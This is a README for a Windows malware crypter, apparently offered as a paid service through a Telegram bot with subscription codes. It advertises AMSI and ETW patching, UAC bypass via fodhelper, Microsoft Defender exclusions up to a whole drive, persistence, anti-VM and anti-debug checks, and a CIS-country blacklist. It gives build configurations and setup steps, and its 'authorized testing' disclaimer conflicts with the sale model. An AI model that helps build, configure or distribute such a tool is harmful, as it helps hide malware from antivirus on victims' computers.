# Motherfudder Crypter

**Production-Ready Windows Crypter** | **Telegram Bot + CLI Interface** | **Enhanced by Florin**

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
[![Language](https://img.shields.io/badge/language-Rust%20%7C%20C%23-orange.svg)]()

---

## Quick Start

### Windows Users (Recommended)

```batch
# Run as Administrator
MOTHERFUDDER.bat
```

The central control panel automates everything:
- Install all prerequisites automatically
- Configure Telegram bot with interactive wizard
- Host the bot in foreground or background
- Check for updates with one click
- Build crypted executables via CLI

### Manual Setup

See [SETUP_GUIDE.md](SETUP_GUIDE.md) for detailed installation instructions.

---

## Credits

### Original Project

**[Motherfudder by backdoorskid](https://github.com/backdoorskid/Motherfudder)**

Original crypter concept and base implementation.

**Please star the original repository if this project helps you.**

### This Enhanced Fork

**Author**: Florin

**Major Enhancements** (+13,000 lines of code):
- Full-featured Telegram bot with interactive UI
- Subscription and redeem code system
- Interactive inline keyboard buttons
- Complete documentation suite (30+ files)
- C:\ drive exclusion option (aggressive mode)
- Enhanced AMSI bypass (Chainski technique)
- Centralized control panel automation
- Integrated auto-update system

**Status**: Production-ready (original project required complete rework)

---

## Features

### Evasion Capabilities

| Feature | Description | Platform |
|---------|-------------|----------|
| **AMSI Bypass** | Memory patching using Chainski technique | .NET only |
| **ETW Patching** | Blocks event tracing for Windows | .NET only |
| **UAC Bypass** | Silent elevation via fodhelper.exe | All |
| **Defender Exclusion** | Path and process exclusions | All |
| **C:\ Drive Exclusion** | Full drive exclusion (aggressive) | All |
| **Persistence** | Auto-start via Task Scheduler | All |
| **Anti-Debug** | Debugger detection and evasion | All |
| **Anti-VM** | Virtual machine detection | All |
| **Geographic Blocking** | CIS country blacklist | All |
| **Single Instance** | Mutex-based duplicate prevention | All |

### Interface Modes

**Telegram Bot**:
- Interactive button-based UI
- Subscription code system
- Real-time configuration toggles
- Built-in FAQ and support
- Auto-update notifications

**CLI Mode**:
- JSON-based configuration
- Batch processing support
- Direct file output

### Binary Support

- Native x86/x64 executables
- .NET x86/x64 assemblies
- Automatic binary type detection

---

## Documentation

### Quick Access

- [SETUP_GUIDE.md](SETUP_GUIDE.md) - Complete setup instructions
- [docs/DOCUMENTATION_INDEX.md](docs/DOCUMENTATION_INDEX.md) - Full documentation index

### Essential Documentation

| Document | Description |
|----------|-------------|
| [Installation Guide](docs/INSTALLATION.md) | Platform-specific installation |
| [Quick Start](docs/QUICKSTART.md) | 5-minute getting started guide |
| [Features Guide](docs/FEATURES.md) | Complete feature documentation |
| [Bot Setup](docs/BOT_SETUP.md) | Telegram bot deployment |
| [FAQ](docs/BOT_PREVIEW.md#faq) | Frequently asked questions |

### Advanced Topics

| Document | Description |
|----------|-------------|
| [UAC Bypass Info](docs/UAC_BYPASS_INFO.md) | Technical UAC bypass details |
| [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md) | Defender evasion techniques |
| [Aggressive Mode](docs/AGGRESSIVE_MODE_WARNING.md) | C:\ drive exclusion warnings |
| [PowerShell Visibility](docs/POWERSHELL_VISIBILITY.md) | Task Manager visibility analysis |

---

## Control Panel

The `MOTHERFUDDER.bat` control panel provides:

1. **Install Prerequisites** - One-click installation of all dependencies
2. **Configure Bot** - Interactive wizard for bot setup
3. **Manage Subscription Codes** - Add, remove, view, or reset codes
4. **Host Bot** - Start bot in foreground or background
5. **Build CLI** - Quick command-line builds
6. **Check Updates** - Automatic update checking and installation
7. **Documentation** - Quick access to all documentation
8. **Help & Support** - Built-in troubleshooting guide
9. **Exit** - Clean exit with credits

**Example Session**:

```batch
> MOTHERFUDDER.bat
Choose an option [1-9]: 1
# Installs Chocolatey, Rust, .NET, VS Build Tools, OpenSSL, Git

Choose an option [1-9]: 2
# Guides through bot token and authentication setup

Choose an option [1-9]: 3
# Add, remove, or manage subscription codes

Choose an option [1-9]: 4
# Starts bot in selected mode
```

---

## Configuration

### Telegram Bot

Edit subscription codes in `MfBuilder/src/telegram_bot.rs`:

```rust
pub const SUBSCRIPTION_CODES: &[&str] = &[
    "YOUR-CODE-HERE",
];
```

Configure bot token in `MfBuilder/.env`:

```
TELOXIDE_TOKEN=YOUR_BOT_TOKEN_HERE
```

### CLI Mode

Edit `MfBuilder/build.json`:

```json
{
    "file_extension": "BAT",
    "anti_debug": true,
    "anti_virtual_machine": true,
    "blacklist_cis_countries": false,
    "uac_bypass": true,
    "single_instance": true,
    "run_on_startup": false,
    "defender_exclusion": true,
    "defender_exclude_drive": false,
    "binder": false
}
```

---

## Recommended Usage

### Standard Configuration

```json
{
    "uac_bypass": true,
    "defender_exclusion": true,
    "defender_exclude_drive": false,
    "persistence": true,
    "anti_debug": true,
    "anti_virtual_machine": true
}
```

### Aggressive Configuration (Testing Only)

```json
{
    "uac_bypass": true,
    "defender_exclusion": true,
    "defender_exclude_drive": true,
    "persistence": true,
    "anti_debug": true,
    "anti_virtual_machine": true
}
```

**Warning**: C:\ drive exclusion is extremely effective but highly suspicious. Use with caution.

---

## Comparison

| Feature | Original | This Fork |
|---------|----------|-----------|
| Status | "Requires rework" | Production Ready |
| Code Quality | Outdated | Refactored |
| Bot Interface | None | Full-featured |
| Interactive UI | None | Inline buttons |
| Subscription System | None | Code-based |
| Auto-Update | None | Built-in |
| Documentation | Minimal | 30+ files |
| Automation | Manual | MEGA .bat |
| Setup Time | Hours | 30 minutes |

---

## Disclaimer

**This tool is for authorized security testing, penetration testing, and educational purposes only.**

Users are responsible for complying with all applicable laws and regulations. Unauthorized use is illegal and unethical.

See [LICENSE](LICENSE) for complete terms.

---

## Acknowledgments

**Original Project**:
- [backdoorskid/Motherfudder](https://github.com/backdoorskid/Motherfudder)

**Research & Techniques**:
- [Chainski's GlobalAMSIBypass](https://github.com/Chainski/GlobalAMSIBypass)
- [EvilBytecode/Ebyte-Syscalls](https://github.com/EvilBytecode/Ebyte-Syscalls)
- [EvilBytecode/Lifetime-Amsi-EtwPatch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch)

**Enhanced by**: Florin

---

## Support

- **Documentation**: [Full Index](docs/DOCUMENTATION_INDEX.md)
- **Issues**: GitHub Issues
- **Contact**: @YourSupportBot (Telegram)

---

## Project Statistics

- **Lines of Code**: +13,000 (enhancements)
- **Documentation**: 30+ professional markdown files
- **Features**: 15+ implemented and working
- **Automation**: Full control panel integration
- **Setup Time**: 30 minutes (automated)

---

**Please star this repository and the original project if it helps you.**

**Version**: 1.0.0 | **Status**: Production Ready | **License**: MIT
